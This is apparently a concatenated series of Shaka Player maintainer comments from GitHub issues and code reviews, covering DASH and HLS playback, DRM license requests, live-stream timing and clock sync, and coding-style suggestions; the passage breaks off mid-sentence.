With Widevine encryption, the TS headers are still in the clear, so we can pull the start time out of it.  With AES-128, the whole data is encrypted, so we can't get the start time.  Even if we ignored that error, we would get a different error later since we don't support AES-128.. > Many thanks @TheModMaker @ismena for sparing your time to look at this issue\n\nFirst Issue:\nAs you said I used\nhttps://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.compiled.debug.js\nand found that the video is still skipping 10 seconds as you can see in this code pen\n\nDid you try clearing your browser cache?  When I go to the code pen link it plays from 0.\n\nSecond issue:\nIts seems that I have to use another lib e.g.HLS.js to play the AES-128 content. If you know a workaround please let me know.\n\nUnfortunately yes, until #850 is closed you'll need to use something else to play that content.\n. #850 is a lower priority for the moment, we are more interested in FairPlay support in #382.  So it won't appear in v2.5; v2.6 is slated to be a code-health release where we are focusing on cleaning the code up and doing some refactorings.  So it will probably not appear until at least v2.7.. We released v2.4 in May and are still working on v2.5.  v2.6 will hopefully have a shorter release cycle, but it is hard to tell.  It will probably be at least 6 months before we can work on that feature.. > We are using \"buffering\" event thrown by shaka.Player to track buffer under runs. whenever this event triggered with buffering = true, it will be counted as one buffer under run.\n\nIs this is correct way to capture buffer under runs?\n\nYes, that is probably the best event for this.\n\nIssue we are having is, when there is seek in playback, this buffering event triggered with buffering = true, it actually not a buffer under run.\nis there any advice on resolving this?.\n\nYou could listen to the video's seeking event to detect a seek, then ignore the following buffering events for a few seconds (or until you get a buffering event with a value of false).. We don't parse PSSH data, we only send the data verbatim to the browser or the license server.  When we see a PSSH data in the manifest, we pass it to the browser; then it creates a license request (binary) which we send verbatim to the license server.\nBut from what I can tell, the license request does contain the key IDs.  The POST data is  actually just JSON data that contains the key ID.  For example, on the Shaka Player demo I see the POST data contain {\"kids\":[\"_u3wDe7erb7v8Lqt8A3QDQ\"],\"type\":\"temporary\"}.  Here is a description of the license request format.\nWe include the keys in the URL to avoid having to hard-code these keys on our server, but you would normally parse the POST data and look up the correct key.  Note that normally the keys aren't available.  The reason we have the keys now is because it is in the license server URL, not in the media.  So generically we can't avoid the license request.. Does this answer all your questions?. While we're at it, we should investigate Python 3 support. IIRC we only required Python 2.7 because of gjslint; now that we don't use that, the only Python we use is our own, which we could write to be Python 3 compatible.. It looks like a bug in your encoder that made your content.  The browser is rejecting the content because the subsamples are the incorrect size.  You should see if there are updates to your encoder and file a bug against them.\nIf you give us a link to the content, we might be able to provide some more insight into what is wrong with the content.  You could also look at chrome://media-internals to see the internal logs from the browser.\nAlso the reason it is intermittent is probably because of ABR selecting the invalid track.  If you manually select the tracks, you should be able to find the bad one quickly.. We are aware that the DASH parsing is not too efficient on embedded platforms.  We thought it was largely due to the actual parsing of the XML, which we can't change; but it may be that we could do something to make processing it faster.\nDoes your content actually use xlinks?  It would really help if you could provide some example content to test with.  I doubt being encrypted will change anything, so you could post clear content.. Also how did you get that dump?  It looks similar to Chrome performance tab.  Can you save a dump of it and send it to us?  You can also privately send the dump and media URLs to shaka-player-issues@google.com and we'll keep it within the team.. I pushed a change to make the xlink part better.  You can test it on the nightly page: https://nightly-dot-shaka-player-demo.appspot.com. FYI, I will create a follow-up to change how this works with the Player configuration.  I will change it to use the manifest value as a default and use the Player configuration as an override.  This means the manifest value will only be used if you don't specify a license server in the configuration.  This is consistent with our other configuration settings being overrides.. Thanks for the offer, but I just pushed that change.. When I notice the errors, the Period@start has changed.  We don't support this case and it is now against the DASH IOP guidelines.  We also support missing startNumber when using $Time$.. I think we created the repository today, so you found that fast.\nIt is a new project to give the features of Shaka Player to native apps (i.e. iOS).  This will be a Framework that allows an iOS app to play streaming media the same as the browser.  It will have a similar looking API as JavaScript and it will be just as easy to use.  You will be able to load a manifest and play the video/audio without any work in your app.. The times in the media need to match the times in the manifest.  So if the manifest says the segment starts at 30 seconds, then the baseMediaDecodeTime needs to be 30 seconds.  You can use the presentationTimeOffset to adjust the media time to be the correct presentation time.  So if the segment starts at 60 seconds and you want it to start at 30 seconds within the presentation, you can set the presentationTimeOffset to 30 * timescale.\nYou can read more about this here: https://github.com/google/shaka-player/blob/master/docs/design/dash-manifests.md. Your license server rejected the license request with a 403 error giving us {\"error\":{\"message\":\"[-7008] Failed to generate Widevine license: INTERNAL_ERROR\",\"code\":-7008}} as response text.  Chances are your policy settings don't allow offline storage or the token is invalid.\nFrom the documentation, the data[0] field of the LICENSE_REQUEST_FAILED error is the internal error that caused the failure.  In this case it is a BAD_HTTP_STATUS, whose documentation says data[1] is the HTTP response code and data[2] is the response text.. How does your license server use the token?  The way we do things is we just send a POST request to a specified URL.  If I'm not mistaken, ExpressPlay uses a query parameter for the token.  If you use a query parameter, you can just set the license server URL to the full URL:\njs\nplayer.configure({drm: {servers: {\n    'com.microsoft.playready': licenseAcquisitionUrl + '?ExpressPlayToken=' + token,\n}}});\nOr in the demo you can just enter the URL in the \"Custom license server\" field (just ignore the certificate URL).\nIf the token needs to be in a header or JSON data, you should take a look a the license wrapping tutorial for how to edit the request before we send it to the license server.. This seems like something you would do in your app.  You can just use player.load(url, startTime) to load at a specific time.  So when they click that link, your app will load at that start time.  You can use video.currentTime to determine when the current time is to set the checkpoint, or you could pass it from your server.  Note that in a live stream, the video.currentTime is (usually) equal to the time since the live stream started; so if the live stream has been going for an hour, you would set the time to 3600 (in seconds).. This is usually caused by the platform rejecting the content, and there is often nothing we can do about it.  I can't reproduce this on our Windows machine.  I get a different error and the video doesn't play at all.  Could you try with verbose logging and post those logs?  Did you try with the nightly site?  Can you also look at the error object to get extended error codes, I think it will be in error.data[0].errorCode.  You could also look at lib/polyfill/patchedmediakeys_ms.js and look at the onMsKeyError_ function to see if there is any more info in the native error object.. When this happens, we get an error from the browser with a code of 0x8004b8ad, which I can't find any reference to this anywhere.  This appears to be some internal COM error with an undocumented error code.  Oddly enough, the video plays fine and I don't get the error if I reload the video in the same tab.\nIt looks like your audio init segment contains invalid data.  The pssh box isn't the correct size and probably results in parsing errors in PlayReady (somehow it doesn't cause video errors).. I'm not sure, but it is hard to diagnose because we are getting invalid data from the media, which will cause errors either way.  I tried doing a similar path with our own assets and the version @gigon sent us that works, and both work fine.  So I don't think it is a race unless we get it with non-broken content.. >@TheModMaker, please explain how come the same asset works fine, including audio, on Edge browser,\nif it has a bad PSSH box?\nMy guess would be Edge either more resilient against errors or has a different parser so it ignores the parts that are wrong.\n\nAnd: do you have any reference Playready content with separate keys for video and audio?\n\nI just tried the Axinom Multi-DRM, multi-key asset and I get the same error, so maybe there is a platform bug or something the IE EME polyfill is doing.  See #959.. > In my opinion, we made dump file when decrypt was done, so it should same as clear content.\n\nBut it's not same.\nPlease give a advice.\n\nI don't know what you are referring to.  It should be impossible to determine the bytes of the data after decryption.  How are you getting the data?\nCould you post a manifest and license server URL that reproduces your problem?  Does the content play on desktop Chrome?  Usually the video stops with no errors like that when we don't get the correct keys from the license server.  This happens when you use the wrong proxy, the proxy is setup incorrectly, or the pssh data in the manifest/media is incorrect.  But without having the content, it will be difficult to determine why it doesn't have the correct keys.. Can you provide a sample asset that reproduces your error?  The zip file you provided doesn't work (probably since it's live and the segments don't exist).\nI also think your PR isn't the correct fix.  The intent is to load the text streams from the current playhead position; if this is close to a Period transition, it should automatically handle a Period transition once it has buffered enough.  I don't think it is a good idea to use the \"active\" Period to start streaming at because it means that we won't display captions for a while.. This is a subtle bug caused by the rapid Period transitions.  In this case, the video is actually buffered 2 Periods ahead of the playhead.  So if the playhead is at Period 6, then the video stream is buffering from Period 8.  When you enable captions, we clear all the buffers (see a TODO).  This causes the video stream to clear the buffer and try a Period transition to Period 6.  On the other hand, the text stream is already in Period 6 so it starts buffering.  Once it hits the end of the Period, it tries to transition to Period 7.  This is where the assertion failure happens because the two streams are trying to transition to different Periods.. It looks like it is a problem with how we create paths in Windows.  But you should not run this with administrator rights.. We actually already have an Xbox One device, we just haven't setup automated testing yet.  We have an internal bug to add some kind of test framework to allow us to test it.  If anyone has suggestions on how to run automated tests (through Karma) it would be appreciated.  But it has been low priority; supposedly it is just the Windows 10 Edge browser, but there are likely subtle platform differences.. A \"bad chunk\" can refer to many different things that can and cannot be ignored.  Getting a 404 would be possible to switch to a different stream, but getting a decoder error on a segment wouldn't be possible to switch.\nWe don't do any automatic switching in this case.  What you could do is set the retry count to 0 and on errors, manually switch to a different stream.\nAs for DRM errors, there may be one or more DRM requests to get the licences and there may be clear streams.  If we get one license, we'll remove any streams we don't have keys for and automatically switch; but if we don't have any licences, we won't remove any streams.  If we did, it would only work if there are clear streams (which is rarely true).. Both Edge and Chromecast's implementations of PlayReady use an incorrect byte-ordering in the key IDs, see this workaround.  But it seems like Tizen doesn't do this.. How are you changing the audio language?  Are you using selectAudioLanguage or selectVariantTrack? \nI'm fairly sure it should work with selectVariantTrack, but if you are using selectAudioLanguage, it may not because of how we switch streams.  My guess would be that you do this early and ABR hasn't stabilized yet, so when we select a new track with the new preference, ABR selects a different video stream and so we clear the buffer.. It looks like when we clear the audio buffer, it triggers a seek to flush the media.  Because the audio buffer is empty, it is considered an unbuffered seek and we clear everything.  We shouldn't be doing this.. For the first issue, why does it matter which Player instance initiated the request?  The idea is that a scheme plugin is a generic way of requesting some data, so it doesn't matter what requested it.\nFor the third issue, you can set response.fromCache to true and the segment will be ignored for ABR calculations.. Actually thinking of this more, the fromCache flag might not work with the latest ABR changes for the progress event.. That number specifies the distance from a gap where we will jump it.  So with that change, we'll jump a gap once we are 0.5 seconds from it.  This ensures we seek before the browser stalls due to not enough media.  This value has no effect on the stall detection.  What is probably happening is the Chromecast is taking too long to start playing after the gap jump so the stall detection kicks in and we do another seek.  The delay before we handle a stall would be better to be configurable.. This is a clock-sync issue.  Your manifest appears to be off by about 30 minutes from the real time.  Here is an analysis I did:\n\nAvailability start time:                2018-06-01 13:29:20.694000+00:00\nCurrent time:                           2018-12-13 17:57:55+00:00\nPeriod start:                           0:00:00\nCurrent time in Period:                 195 days, 4:28:34.306000\nTimescale:                              25\nPresentation time offset:               0\nFirst segment @t:                       421556273\nFirst segment Period time (seconds):    16862250\nFirst segment presentation time:        195 days, 3:57:30\nLast segment @t:                        421557473\nLast segment @d:                        200\nLast segment Period end time (seconds): 16862306\nLast segment presentation end time:     195 days, 3:58:26\n\nWe have fixed this by ignoring the availabilityStartTime and using the segment times instead.  This hasn't made it into a release yet, which is why the demo doesn't show it.  But if you try on the nightly page (https://nightly-dot-shaka-player-demo.appspot.com/demo/), it works fine.  But for interoperability, you should make sure the segments align with the availabilityStartTime.. We added a feature to ignore the availabilityStartTime and use the segment list in the manifest to determine the live edge.  This allows us to play content that has bad clock sync issues (which is unfortunately common).  This means that if your manifest specifies all 10 hours of content, we'll play at the end, even if the availabilityStartTime and the current time says to only play at 2 hours in.\nReally, your packager should only generate content in real time.  I think FFmpeg has an input flag of -r to limit output to real time if you have all the input at once.\nWe currently don't have a way to disable this behavior, so we should add a flag.  You can verify my guess by using the v2.4.x version locally instead of master.. > I am using shakapackager to generate dash output. I am a little confused here. Is it not possible to generate a 10 hr long dash output with a live manifest which should from the availabilityStartTime be able to serve dash chunks till 10 hrs? How else must the player fetch the chunks reading the mpd by not making use of availabilityStartTime ?\nLet's say you have a manifest that has 3 hours of media in it that are from 2-5 hours into the live stream.  The manifest specifies these segments for download by the client.  Let's also say the availabilityStartTime is 3 hours ago.  This means the \"live edge\" is at 3 hours, or is playing at 1 hour into the segments in the manifest.  So there are 2 hours of segments left in the manifest.  But with our new feature we ignore it and start playing at 5 hours into the live stream, at the end of the available segments.\n|---------------------------------------------------------->\n|                      |-------------- Segments -----------|\n|---------------------------------------------------------->\n                                   | Live edge\n0          1           2           3           4        5\n                     Time (hours)\nMost live content is being generated in real time.  The manifest gets updated every few seconds, adding new segments for us to play.  So we should start playing at the last segment in the first manifest so we have the shortest delay between generation and playback.\nBut if you are generating a live stream from VOD that you have in advance, then your manifest may have many more segments than should be played.  In this case, we should use the availabilityStartTime to determine where to start playing.\n\n\nHow can I make this work with the latest version of shaka player?\n\n\nYou can't.  I'm working on adding a flag to disable our new live fixing so your content will work (delays due to the holidays).\n\n\nIf the new master version ignores availabilityStartTime, can't PublishTime be used to calculate the right chunk? How do availabilityStartTime and PublishTime differ in their use?\n\n\nWe don't know if we can trust publishTime and some manifests don't have it.  It is supposed to be when the manifest is generated, but that may not be \"now\".  For example, some live manifests don't need updating, but the \"live edge\" is still moving forward.\nThe current \"live edge\" is equal to now - availabilityStartTime.  But this only works if the client's clock is the same as the server's.  publishTime is just the time the manifest is generated.  For many live manifests this will be the live edge since the manifest is updated every few seconds; but some manifests don't need updating and so it won't be correct.\n\n\nIs there a plan to fix this issue in future? This feature is critical to us and hence we need a stable option.\n\n\nYep, I'll add it soon and it will appear before the v2.5 release.. If you just need to know when we fetch a manifest, you could add a response filter and check the type is shaka.net.NetworkingEngine.RequestType.MANIFEST.  You'll need to introduce a slight delay to allow the manifest to be parsed, but that should work now.  That also won't work when casting, but you could do something similar on the receiver.\n``js\nplayer.getNetworkingEngine().addResponseFilter((type, response) => {\n  if (type == shaka.net.NetworkingEngine.RequestType.MANIFEST)\n    setTimeout(() => checkForUpdates(), 500);\n});. The timeline changes as time passes, not as the manifest is updated.  Every second the seek range moves forward by one second (approximately).  So you'll need to just poll every second or so to update the UI.. Do you see console logs looking likelooking up segment: presentationTime=### currentPeriod.startTime=###?  Can you try with the latest code frommasteror with the nightly: https://nightly-dot-shaka-player-demo.appspot.com/. Usually this is a clock-sync problem; see the first question in the [FAQ](https://github.com/google/shaka-player/blob/master/docs/tutorials/faq.md).  If it plays fine on the nightly, it is a clock sync problem because we fixed #999 on master.  Without a playable manifest URL, we can't diagnose the problem further.  Please provide a manifest URL, or send it to shaka-player-issues@google.com.. I'm not sure what you mean.  Thefetch()method (which is provided by the browser) returns aPromisethat gets resolved once the headers are received.  The fetch plugin returns aPromise` that resolves once all the data is retrieved.\nThere is no way to \"return\" multiple times from a function and a Promise can't be resolved multiple times.  So to give multiple values to the caller, there would need to be an event or callback for each time we got some data.  We do this for the progress event so we can get faster estimates for ABR (see the progressUpdated callback).\nBut (ignoring progress events), we don't care about getting pieces of data; we only care about getting the whole buffer.  So we need to wait until all the data is downloaded for us to be able to do something with it.\nDoes this answer your question?. We have not done much investigation on what is required for #1525, so we don't know what changes are needed to support it or how we want to do it.  If you have any suggestions or questions, you should post them on that issue.  Does this answer all your questions here?. 6001 is REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE, which means the browser doesn't support the requested key system.  Are you using https to access the page that contains the demo?  If you try your manifest with the hosted demo, does it work?  (https://shaka-player-demo.appspot.com/demo/)  Can you provide a link to a webpage that reproduces this problem?  You can send it privately to shaka-player-issues@google.com.. Please go to https://shaka-player-demo.appspot.com/support.html and post the JSON you see.  You said you are using Chrome right?  What version?  Can you post the manifest URL and license server you are using?. Your browser says it supports Widevine and you aren't setting any special configurations to change this, so it should work.  The 6001 error happens before we make an actual license request, so we can debug it with just the manifest URL if you can give it.  You can also send it privately to the team at shaka-player-issues@google.com.. The problem is the manifest specifies the segments go from 0 to 1800 seconds; but your segments have a media time of 446130+ seconds.  You need to use presentationTimeOffset to adjust the media times so they appear at the time specified in the manifest.  See this doc for more info on the presentation timeline.. The presentationTimeOffset is in timescale units, so you need to multiply by that.  Changing the presentationTimeOffset value to 40151700000 works for me.. The only method called setClockOffset is on PresentationTimeline, which shouldn't really be used by the app.  You shouldn't call this method at all, it is called automatically during manifest loading.  This is used to ensure the server and the app have the same clock times.\nAre you talking about playing one MPD file that has multiple parts, or loading multiple MPD files?. We don't really provide a cross-video synchronization mechanism.  You'll probably need to do something in your app.  Assuming the different streams are generated on the same server and have the same availabilityStartTime (i.e. they started at the same time), you could probably just set the video.currentTime for each video to the same time and they should be synchronized.\nAlternatively you'll need to provide some offset from each stream to your app.  For example, if you set video1.currentTime to 45, you may need to set video2.currentTime to 50.  You would need to send this info to your app and handle it yourself.  We don't provide a way to synchronize two videos.  Remember that each video is an independent video stream from our perspective.. Duplicate of #1531, being worked on in PR #1600.  Also note that if you are getting error 6001, it is because your browser doesn't support offline licenses.  Be sure to update Chrome, you can check your browser's support here.  But even if you fix the 6001 error, you'll get a 9007 error because of #1531.. First, setting the video's currentTime causes a seek.  This can be an expensive operation, even if into a buffered region.  I changed your code to avoid seeking if we are close to the time already and the buffering almost went entirely away.\nAnother tip is to pause all the videos until all of them have enough buffered.  This ensures that one video buffering doesn't cause it to fall behind the others and avoids more seeks.  While all of them are playing they should stay in sync, so you should only need to adjust if one of them starts buffering.\nAlso remember that you are downloading 16 different videos concurrently.  This causes a lot of network traffic, so be sure to choose a low resolution.  I have a really fast internet connection and it is almost continuously downloading media.  Which is probably why it is buffering a lot.  Our ABR logic assumes little or no external network traffic, so it won't work with multiple players; this means you should only have one resolution or manually switch between them.\nAlso note that the player has a buffering event that fires when we enter and leave a buffering state.  You can use this to better provide the red border since using waiting and playing can be unstable and I see the border getting stuck on.  The player also has an isBuffering method to check whether it is currently in a buffering state.. Just be careful, fastSeek() may not be precise.  For example, it may move to a nearby keyframe instead of the time you passed in.  If you are looking to keep the videos exactly synced, you'll need to do a normal seek.  It is also only supported on Firefox, not on Chrome or Edge.  See the MDN page for more info.. It looks like we can't handle the version number of your npm install.  Are you using a pre-release or compiled from source version of npm?  What is the output of npm --version?  Can you try with a release version of npm (e.g. 6.4.1).. We can fix it to work with the latest NPM version.  But at least there's a workaround in the meantime.. The reason I added the \"Why didn't we catch  this sooner\" label was because a demo asset was failing and we may want to investigate ways of detecting this sooner.  We have talked about running an automated test to detect asset problems in the past, but all our assets aren't stable on all platforms.  Maybe start with Chrome Linux, since if it doesn't play there we probably shouldn't have it?. Duplicate of #1767.. We don't support iOS (see #997) and Safari doesn't support clear key.  It should work with Chrome or Firefox on Mac.  Take a look at the support matrix in the README.. The polyfills install browser features we need to work.  Since those features don't exist on some browsers, we may incorrectly detect no support on some browsers.  For example, on IE11 we install a polyfill for EME, so we wouldn't detect encryption support until after polyfills are installed.\nThere is also a reverse example.  On Safari 8 there are unfixable bugs and we need to disable a feature so we say the browser isn't supported there.. The first two assets you posted don't have any signalling in the manifest to indicate there is any text content.  I'm also not aware of any way to embed TTML or VTT the same way you embed CEA.  CEA data is special packets within the video stream that we extract to play.  I don't know of a similar way to do that for TTML or VTT.\nNote that we support both TTML and VTT in two different formats.  By itself in text format or embedded within MP4 as its own stream.  So like there is an audio and a video stream, there is a separate stream containing the TTML or VTT data.\nAs for your fiddle, there are some problems with it.  First your HTML includes <index>, which isn't an HTML element, and <head> which isn't correct.  That HTML is already within the <body> tag, so you can't use <head> or <body>.  But it seems to load Shaka Player fine.  Next you load muxjs from GitHub, which doesn't have CORS headers, so the browser likely rejects loading the file.  Lastly you load v2.4.6 of Shaka Player, which doesn't have CEA; you need to load v2.5.0-beta2 or newer to get CEA support (although there may be a bug in beta2 that prevents your asset from playing).. Short answer: No.  We only support playing encrypted videos using EME.  And IE only supports PlayReady through EME.\nLong answer: We could technically request the keys and decrypt the media before passing to the browser.  Since the keys are in the clear, we can just handle the decryption ourselves.  We would need to do this to support #850.  But we have no plans on doing this soon.\nAlso note that ClearKey isn't that secure.  Since the keys are in the clear, it is trivial for someone to get the keys and decrypt the content.  To get the benefits of using encryption, you have to use a DRM scheme to protect the keys.. No, the default_KID must match the value in the tenc box.  We mainly use this field to determine whether we have the correct keys; if we don't have the default_KID key, we'll not play that stream assuming the browser can't decrypt it.  There is no way to change the value of the tenc box since that is what the browser uses to find the correct key to decrypt with.. I assume this is DASH content?  If this is HLS you can just create a video-only variant and we'll play that if we can't play any video+audio variants.  The problem with DASH is you specify a list of video streams to play and a list of audio streams and we combine them.  There isn't a way to specify that you want to allow or forbid playing video-only or audio-only.\nWe could add a feature to allow playing with just video content (which would be consistent with many HLS manifests).  But this has the problem of not throwing an error if the user doesn't expect it.  Usually it should be an error if we can't play any audio or video streams.\nSo this will probably be behind a configuration option to ensure that this only happens if you explicitly allow it.  Probably manifest.dash.allowAudioOnly and manifest.dash.allowVideoOnly.. First, the <Location> element only specifies where to query the MPD, not really where the segments are.  However, it comes up when the segment URLs are relative, then they are relative to the <Location>.  The URLs in your manifest are absolute, so that is the URL we fetch.  <BaseURL> specifies where to fetch the segments and shouldn't be changed.\nIf this isn't the correct interpretation of the elements, can you point to where in the DASH spec it specifies that <Location> should change <BaseURL>?  The only references to <Location> I see are when referring to manifest updates.. So the problem is that the new manifest specifies different URLs for segments than the original?  So the first manifest looks like this:\n<Location>: https://test.org/foo.mpd\n<BaseURL>: https://livesim.dashif.org/base\nSegent: init.mp4\nThis results in fetching a segment for https://livesim.dashif.org/base/init.mp4.  Then we update the manifest by making a request to https://test.org/foo.mpd which results in the following:\n<Location>: https://test.org/foo.mpd\n<BaseURL>: https://test.org/base\nSegent: init.mp4\nWhich should result in a segment request to https://test.org/base/init.mp4.  Is this your situation?  In your original question the two manifests you post both have the same <BaseURL> so we would resolve the segments the same way.\nIf that's the case, I think the problem has to do with how we merge segments here.  We just use the old segments if the times match, but if the URLs change, we will still fetch the old segments.  Note that this is allowed by the DASH spec since the segments at the old URL need to remain valid until they fall outside the availability window.  Even if we change this, we may fetch the old URL for a few segments after the update.. Ok.  So I'm marking this as a bug since what we are doing is less than ideal.  But I've put this on the backlog since we are already behind v2.5 and v2.6 has already been scheduled and doesn't fit in.  If you need this fixed sooner, we'd be happy to review a PR based on my comment above.. Can you describe more what the problem is with the Chromecast app?  What do you do to start casting?  What do you see on the Chromecast?\nAs for the test failures, there are two problems.  First you are running on Linux which doesn't support Edge, so remove that from the browsers list.  Second you appear to be running from an SSH connection or from something that doesn't have the DISPLAY environment variable set.  Usually when you run a command line locally it will set the DISPLAY variable to the current monitor so the browser knows where to display the browser.  If you run from an SSH connection or from a cron job, you'll need to set this manually to the correct display so the browser will appear.  You can alternatively run within a virtual frame buffer.  Enter the following instead:\n```sh\nDISPLAY=:0 ./build/test.py --browsers Chrome,Firefox\nOr alternatively\n./build/test.py --browsers Chrome,Firefox --use-xvfb\n``. Can you please provide us with a playable link to the manifest?  Also please try withv2.5.0-beta3, it contains changes to live edge calculations that will help with time-sync issues.. That means theDrmEngineinstance is destroyed (or thinks it's destroyed).  Can you set a breakpoint inDrmEngine.prototype.destroyto verify it isn't called?  If it is called can you post the stack trace?  Also how are you interacting with the Player?  Are you just callingconfigureandloadand playing content?  Do you ever callloada second time or callunload,detach, ordestroy`?\nAlternatively can you host your demo or a simple repro page so we can debug it?  It would be much easier if we could step through it ourselves.  You can send it privately to shaka-player-issues@google.com if you prefer.. We currently don't support changing codecs at all.  Once we start playing with a codec, we can't change it under normal circumstances.  But there is a new standard to allow switching between codecs that we could use on supported browsers, but we haven't implemented it yet.  See #1528.\nIf there is no browsers support for codec switching, we don't want to support switching because it would require tearing down the media stack and won't be seamless.\nAlso, as described in #1013, we will use the preferredAudioChannelCount setting to choose the initial audio stream.  So if you set it to 6, we'll choose the 6 channel audio initially; otherwise we will choose the 2 channel one.  But you'll be unable to change to a different codec after playback starts.. The problem is that your master playlist has a CODECS value with 7 codecs in it.  We use this value to determine which codecs are in the streams and so we assume there are 7 streams.  So what is probably happening is we are telling the browser that the audio stream has multiple audio tracks in it and the browser rejects it.\nThe preferred thing is to just list the codecs that are in the streams, like just avc1.64001f,mp4a.40.2.  Listing the extra codecs makes it seem like there are more streams than there are.  All browsers we've seen can switch between profiles fine so there is no need to list every profile of the codec you use.. > Hello, I found this player amazing among all. Wanted to know that does it support VAST, VPAID, VMAP, Google IMA?\nWe don't have anything built-in to do it, but you could probably build something on top of Shaka Player to do it.  You could create a second video element to use with a specific ad API and pause the Shaka Player video while an ad is playing.\nWe also have plans to add something to the UI involving ads, but haven't planned it or scoped what it will cover.  You can also follow #1169 for a tutorial to help with that.\n\nAnd\nDoes it has Picture-in Picture feature to keep a minimized player in the corner of the screen when user scroll too far? (This keeps the Player visible to users in any case.)\n\nThe UI has an option to add a PIP button for the out-of-page browser-based PIP.  This is provided by the browser to show a window on top of other windows.  We do not provide an option for in-page PIP.. No, we have not worked on the preload API at all yet.  You should follow #880 for any updates.. Can you try with the latest from master?  It may have already been fixed by d02759bdeaac88d4cda16389281fd707093229f4.. To just try it out, you could just pull the version from our nightly hosted demo https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js.. Also note that when you start the encoding process again, you'll need to have the new segments start after the ones from the previous manifest.  It is possible for FFmpeg to start segment times at 0 or some other arbitrary time, which will cause problems.  Also, you can't change the availabilityStartTime after playback has started; so if the new manifests have a new value it will cause problems.  You also need to encode the same content as before since you can't change things like stream resolutions, codecs, codec settings, etc.\nAre you using SegmentTemplate with duration or are you using SegmentList?  If you change the segment size, it will likely cause problems if you are using the duration attribute in the manifest.. Like I said, the new segments need to appear after the old ones.  What is happening is FFmpeg starts over at 0.  When you start the encoding again, the new segments start at 0 and we think they are the same as the ones we already have.  And once we append them to the <video>, the new segments appear at the wrong time.\nMy guess is that it is impossible to do what you want without a custom packager.  The new segments from the new manifest need to start after the segments from the previous manifest and FFmpeg has no way of knowing when that is.\nJust to be clear, here is what is happening: your previous manfiest says it has segments from 0:30-2:00, then we get a manifest update with the new manifest and it has segments from 0:00-0:45.  We normally will just ignore them since we already have those segments in the index, but if you append the first segment from the new manifest it will appear at time 0:00, not 2:00 like you want.  There is no way to change this since this is expected behavior; the manifest says it starts at 0 seconds so that's where we put it.\nI also suggest you take a look at this doc for more info on the presentation timeline and why this happens.. One idea for this to work is to have a proxy on the server to intercept the manifest and edit it before giving it to the client.  This only works if FFmpeg encodes the segments starting at 0.  You can check this by playing the manifest and checking video.buffered.start(0) at the beginning.\nWhen you start playing, just serve the manifest as-is.  Make sure to not serve the \"static\" version; if you set retry parameters in the Player you can just return a 400 response and we'll retry and you should have the new \"dynamic\" version by then.  Once you get a request to change the segment size, you'll be changing the manifest to change its Period@start time.  The attribute should be 0 or not present from FFmpeg.  You need to set this value to the media time that the transition happens.  So if you changed segment times at 2:30, then set the Period@start to \"PT2M30S\" (format).\nThis will adjust the new content to be later in the timeline so the new content you're encoding will be adjusted to the correct time.  The server will need to remember the adjustment and return the same value for each request.  If you get another request to change the segment times, add that time to the amount of content you've generated since the last time.. It looks like your content is encrypted and we don't support AES-128 (see #850).  For some reason, we aren't detecting it as encrypted.. This file is not needed.  This is already known by the compiler (the error is about duplicate definitions).. How about doing this after player.load() resolves instead?. Replace with:\njs\n/** @type {MediaMetadata} */\nNavigator.prototype.mediaSession;. You'll need a line like:\njs\n/** @type {string} */\nMediaMetadata.prototype.title;. Double check this URL, it doesn't work for me.. Add this field to the shaka.dash.MpdUtils.TimeRange definition.. Add this field to the shaka.dash.MpdUtils.SegmentInfo definition.. Add this field to the shaka.dash.SegmentTemplate.SegmentTemplateInfo definition.. It would be better to use feature detection instead of browser detection.  How about:\njs\nif (Math.round(4503599627370497) != 4503599627370497) {\n...\n}. Please be more politically correct:\njs\n// Workaround for a rounding bug in IE11.. Add a comment that includes why it doesn't need to be rounded.  Something like \"Otherwise, due to the precision of JavaScript numbers, the number must already be an integer.\". Alphabetize these calls.. I think it could be implemented differently.  If you just increment i (not j), then the last segment will be treated as new and will be appended with the logic below (I think).\nIf you do it that way, I would suggest moving the check to the higher else-if chain.. Because if there are leftover new refs after this loop finishes, the code below will append them while adjusting the position numbers correctly  (see line 165+ below).   So if we increment i (ignore old ref), the last ref will be treated as a new ref and that code will handle the renumbering.\nI am also suggesting that you don't push anything, just increment i.  For example:\njs\nif (r1.startTime < r2.startTime) {\n  ...\n} else if (r1.startTime > r2.startTime) {\n  ...\n} else if (Math.abs(r1.endTime - r2.endTime) > 0.1) {\n  // When a period is changed...\n  goog.asserts.assert(...);\n  i++;  // r2 will be pushed as a new ref by the code below.\n} else {\n  newReferences.push(r1);\n  i++;\n  j++;\n}\nBut maybe this is too subtle, the old code is fine if that is better.. Also add a comment here with the URL to your PR.. Unless I am mistaken, 'ms:laurl' is a Microsoft specific element.  I don't believe Widevine has a standard way of embedding URLs in the manifest.. js\nif (record.type == PLAYREADY_RECORD_TYPES.RIGHTS_MANAGEMENT). It would be better to reverse this enum:\njs\n/** @enum {number} */\nvar PLAYREADY_RECORD_TYPES = {\n  RIGHTS_MANAGEMENT: 0x001,\n  RESERVED: 0x002,\n  EMBEDDED_LICENSE: 0x003\n};\nIf you look at my suggestion below, it allows us to use the compiler to check we don't misspell the name.  Your enum here just converts a magic number to a magic string.  Also, our compiler will remove the enum completely, so it avoids an object lookup at runtime.. How about renaming this so it is clear it is a 'mspr:pro' record?  Something like parseMsProRecords_?. You never use the length and recordCount members; how about just returning the array of records directly?. If I remember correctly, Uint16Array uses the host byte order, whereas PlayReady uses little-endian.  You may need to use DataView to read the data with the correct byte order.. Please use shaka.util.StringUtils.fromUTF8 to parse UTF-8  correctly and avoid a possible stack overflow with large strings.. For object types like Array and Uint16Array, use a ! to make it non-nullable.  E.g. {!Array.<T>}.. Did you forget a shift here?  (bytes[0] << 16) | bytes[1]. Even though I would like to use this, caniuse says it is not well supported in all the browsers we support.  You'll probably need to do this in JavaScript.. Joey's suggestion was to use the drm probe to detect browser support.  asset.drm is the key systems available in the asset.  You can use shakaDemo.support_.drm[keySystem] to detect if it is supported on the browser.. You can be more specific on the return value.  {!Promise.<ArrayBuffer>}.. I think Custom license certificate URL would be better.. If you're going to have extra fields on the assets, you should add this field to the shakaAssets.AssetInfo type definition in demo/common/assets.js.. In a real app, where does the certificate come from?  Can the license (or another) server handle this message and give us the certificate?  This happens in the Chrome CDM where the first request may be a certificate request and the license server is expected to give it to us.  It would be nice to avoid a special case for both us and the app.. I think it would be better to not require passing in the video element to AbrManager.  What the app can do is pass a closure to player.configure that will capture the current video element and pass it to their own constructor.  This is what we do for the TextDisplayer.\nFor the Player's default abrFactory, you could set 